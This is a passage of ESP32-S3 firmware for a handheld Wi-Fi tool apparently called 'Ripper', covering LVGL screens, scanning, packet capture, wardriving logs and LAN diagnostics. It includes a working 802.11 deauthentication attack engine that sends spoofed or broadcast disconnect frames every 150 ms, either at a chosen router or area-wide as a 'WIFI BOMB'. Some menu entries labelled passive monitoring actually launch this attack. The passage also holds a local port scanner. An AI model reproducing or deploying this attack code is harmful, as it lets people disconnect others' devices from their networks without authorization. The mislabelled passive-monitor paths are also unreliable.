                "<  WI-FI TOOLS", COLOR_SETTINGS, back_to_wifi_home);
  create_footer(wifi_defensive_monitor_screen);
}


void refresh_wifi_defensive_target_list() {
  if (wifi_defensive_target_list == NULL) return;
  lv_obj_clean(wifi_defensive_target_list);
  const uint8_t shown = min((uint8_t)8, wifi_result_count);
  for (uint8_t i = 0; i < shown; i++) {
    char row[64];
    snprintf(row, sizeof(row), "%s%s  CH%u  %ld dBm",
             i == wifi_defensive_target_index ? "> " : "", wifi_results[i].ssid,
             wifi_results[i].channel, (long)wifi_results[i].rssi);
    lv_obj_t *button = create_button(wifi_defensive_target_list, 2, 2 + i * 38, 278, 34,
                                     row, i == wifi_defensive_target_index ? COLOR_GREEN : COLOR_RF, NULL);
    lv_obj_add_event_cb(button, [](lv_event_t *e) {
      const uint8_t index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
      if (index >= wifi_result_count) return;
      wifi_defensive_target_index = index;
      lv_label_set_text_fmt(wifi_defensive_target_label, "TARGET: %s  |  %s  |  CH%u",
                            wifi_results[index].ssid, wifi_results[index].bssid,
                            wifi_results[index].channel);
      const uint8_t visible = min((uint8_t)8, wifi_result_count);
      for (uint8_t row_index = 0; row_index < visible; row_index++) {
        lv_obj_t *row_button = lv_obj_get_child(wifi_defensive_target_list, row_index);
        char updated[64];
        snprintf(updated, sizeof(updated), "%s%s  CH%u  %ld dBm",
                 row_index == wifi_defensive_target_index ? "> " : "",
                 wifi_results[row_index].ssid, wifi_results[row_index].channel,
                 (long)wifi_results[row_index].rssi);
        lv_label_set_text(lv_obj_get_child(row_button, 0), updated);
      }
    }, LV_EVENT_CLICKED, (void *)(uintptr_t)i);
  }
  if (shown == 0) {
    lv_obj_t *empty = lv_label_create(wifi_defensive_target_list);
    lv_label_set_text(empty, "No scan results. Tap SCAN APS.");
    lv_obj_set_style_text_color(empty, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_center(empty);
  }
  wifi_defensive_last_result_count = wifi_result_count;
}


void open_wifi_defensive_monitor(lv_event_t *e) {
  (void)e;
  if (wifi_defensive_monitor_screen == NULL) return;
  if (wifi_defensive_target_index >= wifi_result_count) wifi_defensive_target_index = -1;
  refresh_wifi_defensive_target_list();
  if (wifi_result_count == 0 && !wifi_scan_active) {
    wifi_defensive_last_result_count = 255;
    lv_label_set_text(wifi_deauth_picker_status_label, "SEARCHING FOR WI-FI NAMES...");
    start_wifi_scan(WIFI_SCAN_NETWORKS);
  }
  lv_scr_load(wifi_defensive_monitor_screen);
}


void scan_wifi_defensive_targets(lv_event_t *e) {
  (void)e;
  wifi_defensive_target_index = -1;
  lv_label_set_text(wifi_defensive_target_label, "TARGET: Select an access point");
  wifi_defensive_last_result_count = 255;
  lv_label_set_text(wifi_deauth_picker_status_label, "SEARCHING FOR WI-FI NAMES...");
  start_wifi_scan(WIFI_SCAN_NETWORKS);
}
// Intercepts the target picker button click and launches the live panel
void handle_target_picker_attack_click(lv_event_t * e) {
    if (wifi_defensive_target_index < 0 || wifi_defensive_target_index >= wifi_result_count) {
        lv_label_set_text(wifi_deauth_picker_status_label, "Select a Wi-Fi name first.");
        return;
    }

    // Lock your main scanner's choice variable to match what you tapped in the picker list
    wifi_selected_network = wifi_defensive_target_index;

    // Launch your live backend engine screen with targeted mode turned ON (true)
    open_wifi_deauth_live_attack(true);
}


void start_wifi_bomb_live(lv_event_t *e) {
    (void)e;
    open_wifi_deauth_live_attack(false); 
}


void service_wifi_deauth_target_picker() {
  if (wifi_defensive_monitor_screen != NULL && lv_scr_act() == wifi_defensive_monitor_screen &&
      !wifi_scan_active && wifi_defensive_last_result_count != wifi_result_count) {
    refresh_wifi_defensive_target_list();
    lv_label_set_text_fmt(wifi_deauth_picker_status_label, "%u WI-FI NAME%s FOUND",
                          wifi_result_count, wifi_result_count == 1 ? "" : "S");
  }
}

// ============================================================
// LIVE WI-FI BROADCAST DEAUTH PAYLOAD ENGINE & UI
// ============================================================



// ============================================================
// CORE RAW 802.11 TRANSMISSION ENGINE
// ============================================================
void run_dynamic_deauth_injection() {
    // Force the ESP32-S3 radio to the target channel
    esp_wifi_set_channel(dynamic_target_chan, WIFI_SECOND_CHAN_NONE);

    // Structure the exact 26-byte raw Wi-Fi management frame layout in memory
    uint8_t packet[26];
    
    packet[0] = 0xC0; // Type/Subtype: Management Frame / Deauthentication
    packet[1] = 0x00; // Frame Control Flags
    packet[2] = 0x00; packet[3] = 0x00; // Duration context (0 us)
    
    if (vibe_is_targeted_mode) {
        // TARGETED ATTACK: Precision spoofing using the real router MAC address
        memcpy(&packet[4], dynamic_target_client, 6);  // Destination client
        memcpy(&packet[10], dynamic_target_ap, 6);     // Spoofed Source (Router MAC)
        memcpy(&packet[16], dynamic_target_ap, 6);     // BSSID context
    } else {
        // UNTARGETED ATTACK (WIFI BOMB): Broad area-wide test using universal broadcast blocks
        memset(&packet[4], 0xFF, 6);  // Destination broadcast
        memset(&packet[10], 0xFF, 6); // Source spoof
        memset(&packet[16], 0xFF, 6); // BSSID context
    }
    
    packet[22] = 0x00; packet[23] = 0x00; // Sequence control (Handled by hardware)
    packet[24] = 0x07; packet[25] = 0x00; // Reason Code: 7 (Class 3 frame received from nonassociated station)

    // Blast the compiled buffer straight onto the airwaves
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}


// ============================================================
// LIVE TARGETED & UNTARGETED DEAUTH ATTACK INTERFACE & LOGIC
// ============================================================

// Background timer loop driven smoothly by the LVGL engine tick rate
static void vibe_deauth_tick_callback(lv_timer_t * timer) {
    if (vibe_deauth_active) {
        run_dynamic_deauth_injection();
        vibe_pkts_sent++;
        
        // Update the live counter label on your display screen canvas
        lv_label_set_text_fmt(vibe_count_label, "PKTS INJECTED: %lu", vibe_pkts_sent);
    }
}

// Handles tap/click triggers on the main START/STOP button widget
static void handle_vibe_attack_toggle_click(lv_event_t * e) {
    vibe_deauth_active = !vibe_deauth_active;
    
    if (vibe_deauth_active) {
        lv_timer_resume(vibe_engine_timer);
        lv_label_set_text(vibe_status_label, "STATUS: ATTACKING...");
        lv_obj_set_style_bg_color(vibe_action_btn, lv_color_make(220, 50, 50), 0); // Active Attack Red
        lv_label_set_text(vibe_btn_label, "STOP ATTACK");
        set_status("TRANSMITTING", COLOR_SETTINGS);
    } else {
        lv_timer_pause(vibe_engine_timer);
        lv_label_set_text(vibe_status_label, "STATUS: READY");
        lv_obj_set_style_bg_color(vibe_action_btn, lv_color_make(40, 160, 40), 0); // Ready Green
        lv_label_set_text(vibe_btn_label, "START ATTACK");
        set_status("SYSTEM READY", COLOR_READY);
    }
}

// Handles tap triggers on the bottom RETURN button widget
// Handles tap triggers on the bottom RETURN button widget cleanly
static void handle_vibe_exit_deauth_click(lv_event_t * e) {
    vibe_deauth_active = false;
    vibe_pkts_sent = 0;
    if (vibe_engine_timer) {
        lv_timer_pause(vibe_engine_timer);
    }
    
    // Clear out radio states cleanly
    wifi_enter_operating_state(WIFI_OP_IDLE);
    set_status("SYSTEM READY", COLOR_READY);

    // FIX: Safely find and delete the current screen to go home
    lv_obj_t * current_screen = lv_scr_act();
    lv_scr_load(wifi_screen); // Send user back to Wi-Fi base list view
    lv_obj_del(current_screen); // Safely wipe old allocation memory path
}

// Draws the visual user screen onto your Waveshare 3.5" panel space
void create_vibe_deauth_attack_screen() {
    esp_wifi_set_promiscuous(true); // Unlocks raw Wi-Fi injection paths on the ESP32-S3

    vibe_deauth_screen = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(vibe_deauth_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(vibe_deauth_screen, LV_OPA_COVER, LV_PART_MAIN);
    create_cyber_background(vibe_deauth_screen, false);
    create_header(vibe_deauth_screen,
                  vibe_is_targeted_mode ? "TARGETED DEAUTH" : "WI-FI BOMB");

    // Network Target Status Profile Container Box
    lv_obj_t * monitor_card = lv_obj_create(vibe_deauth_screen);
    lv_obj_set_size(monitor_card, 294, 112);
    lv_obj_set_pos(monitor_card, 13, 108);
    lv_obj_set_style_pad_all(monitor_card, 12, LV_PART_MAIN);
    lv_obj_set_style_bg_color(monitor_card, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(monitor_card, LV_OPA_90, LV_PART_MAIN);
    lv_obj_set_style_border_color(monitor_card, lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_border_width(monitor_card, 1, LV_PART_MAIN);
    lv_obj_set_style_radius(monitor_card, 10, LV_PART_MAIN);
    lv_obj_clear_flag(monitor_card, LV_OBJ_FLAG_SCROLLABLE);

    vibe_target_label = lv_label_create(monitor_card);
    if (vibe_is_targeted_mode) {
        lv_label_set_text_fmt(vibe_target_label, "SSID: %s\nCHAN: %u\nMODE: LOCKED TARGET NETWORK ATTACK", 
                              dynamic_target_ssid.c_str(), dynamic_target_chan);
    } else {
        lv_label_set_text_fmt(vibe_target_label, "SSID: AREA-WIDE\nCHAN: %u\nMODE: UNTARGETED WIFI BOMB BROADCAST", 
                              wifi_monitor_channel);
    }
    lv_obj_set_width(vibe_target_label, 268);
    lv_label_set_long_mode(vibe_target_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_color(vibe_target_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
    lv_obj_set_style_text_font(vibe_target_label, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(vibe_target_label, LV_TEXT_ALIGN_LEFT, LV_PART_MAIN);
    lv_obj_align(vibe_target_label, LV_ALIGN_TOP_LEFT, 0, 0);

    // Live Readout Labels
    vibe_status_label = lv_label_create(vibe_deauth_screen);
    lv_label_set_text(vibe_status_label, "STATUS: READY");
    lv_obj_set_width(vibe_status_label, 280);
    lv_obj_set_style_text_color(vibe_status_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
    lv_obj_set_style_text_font(vibe_status_label, &lv_font_montserrat_14, LV_PART_MAIN);
    lv_obj_set_style_text_align(vibe_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_align(vibe_status_label, LV_ALIGN_TOP_MID, 0, 238);

    vibe_count_label = lv_label_create(vibe_deauth_screen);
    lv_label_set_text(vibe_count_label, "PKTS INJECTED: 0");
    lv_obj_set_width(vibe_count_label, 280);
    lv_obj_set_style_text_color(vibe_count_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
    lv_obj_set_style_text_font(vibe_count_label, &lv_font_montserrat_12, LV_PART_MAIN);
    lv_obj_set_style_text_align(vibe_count_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_align(vibe_count_label, LV_ALIGN_TOP_MID, 0, 266);

    // Interactive Core Action Toggle Button
    vibe_action_btn = create_button(vibe_deauth_screen, 20, 306, 280, 54,
                                    "START ATTACK", COLOR_GREEN,
                                    handle_vibe_attack_toggle_click);
    vibe_btn_label = lv_obj_get_child(vibe_action_btn, 0);
    lv_obj_set_style_text_font(vibe_btn_label, &lv_font_montserrat_16, LV_PART_MAIN);

    // Exit Navigation Button Layout
    create_button(vibe_deauth_screen, 70, 390, 180, 34,
                  "<  WI-FI TOOLS", COLOR_SETTINGS,
                  handle_vibe_exit_deauth_click);
    create_footer(vibe_deauth_screen);

    // Dynamic background execution timer firing every 150ms intervals
    vibe_engine_timer = lv_timer_create(vibe_deauth_tick_callback, 150, NULL);
    lv_timer_pause(vibe_engine_timer); 

    lv_scr_load(vibe_deauth_screen);
}

// Launcher initialization function to parse target data and load screens
void open_wifi_deauth_live_attack(bool enable_targeted) {
    wifi_enter_operating_state(WIFI_OP_IDLE); // Clear operating registers safely
    
    vibe_is_targeted_mode = enable_targeted; // Pass the toggle down globally
    vibe_deauth_active = false;
    vibe_pkts_sent = 0;

    if (vibe_is_targeted_mode && wifi_selected_network >= 0 && wifi_selected_network < wifi_result_count) {
        // Collect credentials from network list row selections specifically
        WifiNetworkResult &selected_router = wifi_results[wifi_selected_network];
        dynamic_target_ssid = String(selected_router.ssid);
        dynamic_target_chan = selected_router.channel;
        
        // Translate alphanumeric string back into array bytes
        int parsed_mac[6];
        if (sscanf(selected_router.bssid, "%x:%x:%x:%x:%x:%x", 
                   &parsed_mac[0], &parsed_mac[1], &parsed_mac[2], 
                   &parsed_mac[3], &parsed_mac[4], &parsed_mac[5]) == 6) {
            for (int i = 0; i < 6; i++) {
                dynamic_target_ap[i] = (uint8_t)parsed_mac[i];
            }
        }
    } else {
        // Fallback or explicit WiFi Bomb broadcast execution profiles
        dynamic_target_ssid = "Area Broadcast";
        dynamic_target_chan = wifi_monitor_channel;
        memset(dynamic_target_ap, 0xFF, 6);
    }

    create_vibe_deauth_attack_screen();
}

void open_wifi_tool(lv_event_t *e) {
  const uint8_t menu_index = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (menu_index >= WIFI_COMPARISON_MENU_COUNT || wifi_tool_screen == NULL) return;
  wifi_active_tool = WIFI_COMPARISON_TOOL_IDS[menu_index];
  wifi_active_menu_index = menu_index;
  lv_label_set_text(wifi_tool_title_label, WIFI_COMPARISON_MENU_NAMES[menu_index]);
  lv_label_set_text(wifi_tool_status_label, "Tap START to run this tool.");
  lv_obj_t *action_label = lv_obj_get_child(wifi_tool_action_button, 0);
  lv_label_set_text(action_label, "START");
  lv_scr_load(wifi_tool_screen);
}


void wifi_ping_success(esp_ping_handle_t handle, void *args) {
  uint32_t elapsed = 0;
  esp_ping_get_profile(handle, ESP_PING_PROF_TIMEGAP, &elapsed, sizeof(elapsed));
  wifi_ping_received++;
  wifi_ping_total_ms += elapsed;
  if (elapsed < wifi_ping_min_ms) wifi_ping_min_ms = elapsed;
  if (elapsed > wifi_ping_max_ms) wifi_ping_max_ms = elapsed;
}


void wifi_ping_timeout(esp_ping_handle_t handle, void *args) {
  (void)handle;
  (void)args;
}


void wifi_ping_end(esp_ping_handle_t handle, void *args) {
  esp_ping_get_profile(handle, ESP_PING_PROF_REQUEST, (void *)&wifi_ping_sent, sizeof(wifi_ping_sent));
  wifi_ping_finished = true;
}


bool start_wifi_ping_test(IPAddress target) {
  if (wifi_ping_handle != NULL) {
    esp_ping_stop(wifi_ping_handle);
    esp_ping_delete_session(wifi_ping_handle);
    wifi_ping_handle = NULL;
  }
  wifi_ping_sent = wifi_ping_received = wifi_ping_total_ms = wifi_ping_max_ms = 0;
  wifi_ping_min_ms = UINT32_MAX;
  wifi_ping_finished = false;
  esp_ping_config_t config = ESP_PING_DEFAULT_CONFIG();
  config.count = 8;
  config.interval_ms = 350;
  config.timeout_ms = 800;
  IP_ADDR4(&config.target_addr, target[0], target[1], target[2], target[3]);
  esp_ping_callbacks_t callbacks = {};
  callbacks.on_ping_success = wifi_ping_success;
  callbacks.on_ping_timeout = wifi_ping_timeout;
  callbacks.on_ping_end = wifi_ping_end;
  if (esp_ping_new_session(&config, &callbacks, &wifi_ping_handle) != ESP_OK) return false;
  return esp_ping_start(wifi_ping_handle) == ESP_OK;
}


void run_wifi_tool(lv_event_t *e) {
  (void)e;
  char report[520] = {};
  switch (wifi_active_tool) {
    case 4:
      if (wifi_monitor_running) stop_wifi_monitor(); else start_wifi_monitor(true);
      snprintf(report, sizeof(report), "Channel hopping %s.\nListening across channels 1-13.", wifi_monitor_running ? "running" : "stopped");
      break;
    case 5:
    case 8:
        // Pass true to tell the new engine to launch a Targeted attack
        open_wifi_deauth_live_attack(true);
        break;
    case 9:
      if (wifi_monitor_running) stop_wifi_monitor(); else start_wifi_monitor(true);
      snprintf(report, sizeof(report), "Passive monitor %s.\nNo packets are transmitted.", wifi_monitor_running ? "running" : "stopped");
      break;
    case 10:
      if (wifi_pcap_recording) {
        stop_wifi_pcap();
        snprintf(report, sizeof(report), "Recording saved to the microSD card.");
      } else if (start_wifi_pcap()) {
        snprintf(report, sizeof(report), "Recording nearby 802.11 activity.\nTap STOP to finish and close the file.");
      } else {
        snprintf(report, sizeof(report), "PCAP needs a writable microSD card.");
      }
      break;
    case 11:
      if (wifi_pcap_recording) {
        stop_wifi_pcap();
        snprintf(report, sizeof(report), "Handshake observation stopped.\nCaptured frames were closed safely on microSD.");
      } else if (start_wifi_pcap()) {
        snprintf(report, sizeof(report), "Watching for WPA/WPA2 EAPOL exchanges.\nRelevant traffic is preserved in PCAP.\nNo disconnect frames are transmitted.");
      } else {
        start_wifi_monitor(true);
        snprintf(report, sizeof(report), "Watching for EAPOL exchanges.\nInsert microSD to preserve a PCAP file.");
      }
      break;
    case 13:
      if (wifi_ap_service_running) {
        stop_wifi_ap_services();
        snprintf(report, sizeof(report), "Ripper hotspot stopped.");
      } else {
        start_wifi_ap_services(false);
        snprintf(report, sizeof(report), "Protected local AP is active.\nNetwork: Ripper-Control\nPassword: %s\nAddress: %s", wifi_control_password(), WiFi.softAPIP().toString().c_str());
      }
      break;
    case 15:
      if (wifi_ap_service_running) {
        stop_wifi_ap_services();
        snprintf(report, sizeof(report), "Ripper hotspot stopped.");
      } else {
        start_wifi_ap_services(false);
        snprintf(report, sizeof(report), "Ripper-Control is active.\nPassword: %s\nOpen http://%s", wifi_control_password(), WiFi.softAPIP().toString().c_str());
      }
      break;
    case 16:
      if (wifi_ap_service_running) {
        stop_wifi_ap_services();
        snprintf(report, sizeof(report), "Setup portal stopped.");
      } else {
        start_wifi_ap_services(true);
        snprintf(report, sizeof(report), "Ripper-Setup portal is active.\nPassword: %s\nEnter the owner's Wi-Fi name and password.\nOpen http://%s", wifi_control_password(), WiFi.softAPIP().toString().c_str());
      }
      break;
    case 17:
      if (wifi_ap_service_running) {
        stop_wifi_ap_services();
        snprintf(report, sizeof(report), "Controlled portal simulation stopped.");
      } else {
        start_wifi_ap_services(false);
        wifi_dns_server.start(53, "*", WiFi.softAPIP());
        snprintf(report, sizeof(report), "Controlled portal simulation active.\nPassword: %s\nNo password form or credential storage.\nOpen http://%s", wifi_control_password(), WiFi.softAPIP().toString().c_str());
      }
      break;
    case 18:
      if (begin_wifi_lan_diagnostic()) {
        wifi_host_discovery_running = true;
        wifi_host_discovery_address = 1;
        wifi_host_discovery_found = 0;
        snprintf(wifi_host_discovery_report, sizeof(wifi_host_discovery_report), "Hosts responding on local services:\n");
        snprintf(report, sizeof(report), "Scanning your local /24 network...\nThis checks common services without logging in.");
      } else snprintf(report, sizeof(report), "Connect Ripper to your own Wi-Fi first.");
      break;
    case 19:
      if (begin_wifi_lan_diagnostic()) {
        const uint16_t ports[] = { 22, 53, 80, 443, 554, 1883, 8080 };
        IPAddress target = WiFi.gatewayIP();
        int used = snprintf(report, sizeof(report), "Router %s\nOpen services:", target.toString().c_str());
        for (uint8_t i = 0; i < sizeof(ports) / sizeof(ports[0]); i++) {
          WiFiClient client;
          client.setTimeout(120);
          if (client.connect(target, ports[i], 120)) {
            used += snprintf(report + used, sizeof(report) - used, " %u", ports[i]);
            client.stop();
          }
        }
        if (used < 40) strlcat(report, " none found", sizeof(report));
      } else snprintf(report, sizeof(report), "Connect Ripper to your own Wi-Fi first.");
      break;
    case 20:
      if (begin_wifi_lan_diagnostic()) {
        const bool started = start_wifi_ping_test(WiFi.gatewayIP());
        snprintf(report, sizeof(report), started ? "Pinging router %s...\n8 ICMP echo requests" : "Could not start the ICMP ping test.",
                 WiFi.gatewayIP().toString().c_str());
      } else snprintf(report, sizeof(report), "Connect Ripper to your own Wi-Fi first.");
      break;
    case 22:
      if (!sd_card_ready) snprintf(report, sizeof(report), "Wardriving log needs a writable microSD card.");
      else if (wifi_result_count == 0) snprintf(report, sizeof(report), "Run Network Scanner first, then save the visible networks.");
      else {
        File log = SD_MMC.open("/wifi_wardrive.csv", FILE_APPEND);
        if (log) {
          if (log.size() == 0) log.println("uptime_ms,ssid,bssid,channel,rssi,security,gps_valid,latitude,longitude,gps_age_ms");
          for (uint8_t i = 0; i < wifi_result_count; i++) {
            log.printf("%lu,\"%s\",%s,%u,%ld,%s,%u,%.6f,%.6f,%lu\n", millis(), wifi_results[i].ssid,
                       wifi_results[i].bssid, wifi_results[i].channel, (long)wifi_results[i].rssi,
                       wifi_radar_security_label(wifi_results[i].auth), wifi_gps_fix_valid ? 1 : 0,
                       wifi_gps_latitude, wifi_gps_longitude,
                       wifi_gps_fix_valid ? millis() - wifi_gps_fix_time_ms : 0UL);
          }
          log.close();
          snprintf(report, sizeof(report), "Saved %u networks to\n/wifi_wardrive.csv\nGPS can be added later.", wifi_result_count);
        } else snprintf(report, sizeof(report), "Could not open the wardriving log.");
      }
      break;
    case 24:
      if (!sd_card_ready) snprintf(report, sizeof(report), "Insert a microSD card to view saved Wi-Fi files.");
      else {
        File root = SD_MMC.open("/");
        int used = snprintf(report, sizeof(report), "SAVED WI-FI FILES\n");
        uint8_t shown = 0;
        File entry = root.openNextFile();
        while (entry && shown < 10) {
          const char *name = entry.name();
          if (strstr(name, "wifi_") != NULL) {
            used += snprintf(report + used, sizeof(report) - used, "\n%s  %lu B", name, (unsigned long)entry.size());
            shown++;
          }
          entry.close();
          entry = root.openNextFile();
        }
        root.close();
        if (shown == 0) strlcat(report, "\nNo Wi-Fi captures saved yet.", sizeof(report));
      }
      break;
    default:
      snprintf(report, sizeof(report), "This tool uses its dedicated screen.");
      break;
  }
  if (wifi_pcap_recording) set_status("RECORDING", COLOR_SAVED);
  else if (wifi_monitor_running) set_status("LISTENING", COLOR_GREEN);
  else if (wifi_ap_service_running) set_status("SERVING", COLOR_GREEN);
  else if (wifi_host_discovery_running || wifi_ping_handle != NULL)
    set_status("DIAGNOSTICS", COLOR_SETTINGS);
  else set_status("SYSTEM READY", COLOR_READY);
  lv_label_set_text(wifi_tool_status_label, report);
  lv_label_set_text(lv_obj_get_child(wifi_tool_action_button, 0),
                    (wifi_monitor_running || wifi_pcap_recording || wifi_ap_service_running) ? "STOP / TOGGLE" : "RUN AGAIN");
}


void stop_and_leave_wifi_tool(lv_event_t *e) {
  (void)e;
  if (wifi_pcap_recording) stop_wifi_pcap();
  else stop_wifi_monitor();
  stop_wifi_ap_services();
  wifi_host_discovery_running = false;
  back_to_wifi_home(NULL);
}


void refresh_wifi_tool_status() {
  if (wifi_tool_screen == NULL || lv_scr_act() != wifi_tool_screen) return;
  if (!wifi_monitor_running || millis() - wifi_last_tool_refresh_ms < 500) return;
  wifi_last_tool_refresh_ms = millis();
  switch (wifi_active_tool) {
    case 4:
      lv_label_set_text_fmt(wifi_tool_status_label, "Hopping channels 1-13\nCurrent channel: %u\nPackets heard: %lu", wifi_monitor_channel, wifi_packet_count);
      break;
    case 5:
      if (wifi_active_menu_index == 3) {
        char clients[520];
        WifiObservedClient observed[WIFI_OBSERVED_CLIENTS] = {};
        uint8_t observed_count = 0;
        portENTER_CRITICAL(&wifi_clients_lock);
        observed_count = wifi_observed_client_count;
        memcpy(observed, wifi_observed_clients, sizeof(observed));
        portEXIT_CRITICAL(&wifi_clients_lock);
        int used = snprintf(clients, sizeof(clients), "%u device%s observed\n", observed_count,
                            observed_count == 1 ? "" : "s");
        for (uint8_t i = 0; i < observed_count && i < 7 && used > 0; i++) {
          WifiObservedClient &client = observed[i];
          used += snprintf(clients + used, sizeof(clients) - used,
                           "\n%02X:%02X:%02X:%02X:%02X:%02X  %d dBm  CH%u",
                           client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5],
                           client.rssi, client.channel);
        }
        lv_label_set_text(wifi_tool_status_label, clients);
      } else {
        lv_label_set_text_fmt(wifi_tool_status_label, "Packets: %lu\nChannel: %u\nLatest signal: %d dBm", wifi_packet_count, wifi_monitor_channel, wifi_last_packet_rssi);
      }
      break;
    case 8:
      lv_label_set_text_fmt(wifi_tool_status_label, "Disconnect frames observed: %lu\nPassive alert monitor only.", wifi_deauth_count);
      break;
    case 9:
      {
        char events[520];
        int used = snprintf(events, sizeof(events), "Auth %lu  Assoc %lu  Disconnect %lu  EAPOL %lu\n",
                            wifi_auth_count, wifi_assoc_count, wifi_deauth_count, wifi_eapol_count);
        WifiEventRecord event_snapshot[WIFI_EVENT_HISTORY_SIZE] = {};
        uint32_t event_total_snapshot = 0;
        uint8_t event_write_snapshot = 0;
        portENTER_CRITICAL(&wifi_events_lock);
        event_total_snapshot = wifi_event_total;
        event_write_snapshot = wifi_event_write;
        memcpy(event_snapshot, wifi_event_history, sizeof(event_snapshot));
        portEXIT_CRITICAL(&wifi_events_lock);
        const uint8_t available = event_total_snapshot > WIFI_EVENT_HISTORY_SIZE ? WIFI_EVENT_HISTORY_SIZE : event_total_snapshot;
        for (uint8_t row = 0; row < available && row < 7; row++) {
          const uint8_t index = (event_write_snapshot + WIFI_EVENT_HISTORY_SIZE - 1 - row) % WIFI_EVENT_HISTORY_SIZE;
          WifiEventRecord &event = event_snapshot[index];
          const char *kind = event.kind == 1 ? "AUTH" : event.kind == 2 ? "ASSOC" : event.kind == 3 ? "DISCONNECT" : "EAPOL";
          used += snprintf(events + used, sizeof(events) - used,
                           "\n%lus %s CH%u %d dBm",
                           event.time_ms / 1000UL, kind, event.channel, event.rssi);
        }
        lv_label_set_text(wifi_tool_status_label, events);
      }
      break;
    case 10:
      lv_label_set_text_fmt(wifi_tool_status_label, "PCAP recording\nPackets seen: %lu\nDropped: %lu\nChannel: %u",
                            wifi_packet_count, wifi_capture_dropped_packets, wifi_monitor_channel);
      break;
    case 11:
      lv_label_set_text_fmt(wifi_tool_status_label, "Observed EAPOL exchanges: %lu\nPassive authorized observation only.", wifi_eapol_count);
      break;
  }
}


void service_wifi_tools() {
  if (wifi_operating_state == WIFI_OP_STA_CONNECTING && WiFi.status() == WL_CONNECTED) {
    wifi_operating_state = WIFI_OP_STA_CONNECTED;
    if (wifi_connect_pending) {
      wifi_preferences.begin("ripper-wifi", false);
      wifi_preferences.putString("ssid", wifi_connect_pending_ssid);
      wifi_preferences.putString("password", wifi_connect_pending_password);
      wifi_preferences.end();
      wifi_saved_connection_attempted = true;
      wifi_connect_pending = false;
      wifi_connect_started_ms = 0;
      if (wifi_connect_status_label != NULL)
        lv_label_set_text_fmt(wifi_connect_status_label,
                              "CONNECTED AND SAVED\n%s\n%s",
                              wifi_connect_pending_ssid, WiFi.localIP().toString().c_str());
      set_status("CONNECTED", COLOR_GREEN);
    } else {
      set_status("SYSTEM READY", COLOR_READY);
    }
  } else if (wifi_operating_state == WIFI_OP_STA_CONNECTING && wifi_connect_pending &&
             millis() - wifi_connect_started_ms >= 15000UL) {
    WiFi.disconnect(false, false);
    wifi_operating_state = WIFI_OP_IDLE;
    wifi_connect_pending = false;
    wifi_connect_started_ms = 0;
    if (wifi_connect_status_label != NULL)
      lv_label_set_text(wifi_connect_status_label,
                        "CONNECTION FAILED\nCheck the password and try again.");
    set_status("SYSTEM READY", COLOR_READY);
  } else if ((wifi_operating_state == WIFI_OP_STA_CONNECTED || wifi_operating_state == WIFI_OP_LAN_DIAGNOSTIC) &&
           WiFi.status() != WL_CONNECTED)
    wifi_operating_state = WIFI_OP_IDLE;
  if (wifi_monitor_running && wifi_channel_hopping && (int32_t)(millis() - wifi_next_channel_ms) >= 0) {
    wifi_monitor_channel = wifi_monitor_channel >= 13 ? 1 : wifi_monitor_channel + 1;
    esp_wifi_set_channel(wifi_monitor_channel, WIFI_SECOND_CHAN_NONE);
    wifi_next_channel_ms = millis() + 450;
  }
  service_wifi_capture_queue();
  if (wifi_host_discovery_running && WiFi.status() == WL_CONNECTED) {
    IPAddress target = WiFi.localIP();
    target[3] = wifi_host_discovery_address;
    bool found = target == WiFi.gatewayIP();
    if (target != WiFi.localIP()) {
      const uint16_t discovery_ports[] = { 22, 23, 80, 443, 554, 1883, 8080 };
      for (uint8_t i = 0; i < sizeof(discovery_ports) / sizeof(discovery_ports[0]) && !found; i++) {
        WiFiClient probe;
        found = probe.connect(target, discovery_ports[i], 12);
        probe.stop();
      }
    }
    if (found && wifi_host_discovery_found < 12) {
      wifi_host_discovery_found++;
      char row[28];
      snprintf(row, sizeof(row), "%s\n", target.toString().c_str());
      strlcat(wifi_host_discovery_report, row, sizeof(wifi_host_discovery_report));
    }
    wifi_host_discovery_address++;
    if (wifi_host_discovery_address > 254) {
      wifi_host_discovery_running = false;
      if (wifi_host_discovery_found == 0)
        strlcat(wifi_host_discovery_report, "No hosts answered the safe service check.", sizeof(wifi_host_discovery_report));
      if (wifi_tool_status_label != NULL) lv_label_set_text(wifi_tool_status_label, wifi_host_discovery_report);
      set_status("SYSTEM READY", COLOR_READY);
    } else if (wifi_tool_status_label != NULL && wifi_active_tool == 18) {
      lv_label_set_text_fmt(wifi_tool_status_label, "Scanning local network...\nAddress %u of 254\n%u host%s found",
                            wifi_host_discovery_address, wifi_host_discovery_found,
                            wifi_host_discovery_found == 1 ? "" : "s");
    }
  }
  if (wifi_ap_service_running) {
    wifi_dns_server.processNextRequest();
    wifi_web_server.handleClient();
  }
  refresh_wifi_tool_status();
  if (wifi_channels_screen != NULL && lv_scr_act() == wifi_channels_screen && wifi_monitor_running &&
      millis() - wifi_last_tool_refresh_ms >= 500) {
    wifi_last_tool_refresh_ms = millis();
    refresh_wifi_channel_chart();
  }
  if (wifi_ping_finished && wifi_tool_screen != NULL && lv_scr_act() == wifi_tool_screen && wifi_active_tool == 20) {
    wifi_ping_finished = false;
    const uint32_t average = wifi_ping_received ? wifi_ping_total_ms / wifi_ping_received : 0;
    const uint32_t loss = wifi_ping_sent ? ((wifi_ping_sent - wifi_ping_received) * 100UL / wifi_ping_sent) : 100;
    lv_label_set_text_fmt(wifi_tool_status_label,
                          "PING COMPLETE\nSent %lu  Received %lu\nLoss %lu%%\nMin %lu ms  Avg %lu ms  Max %lu ms",
                          wifi_ping_sent, wifi_ping_received, loss,
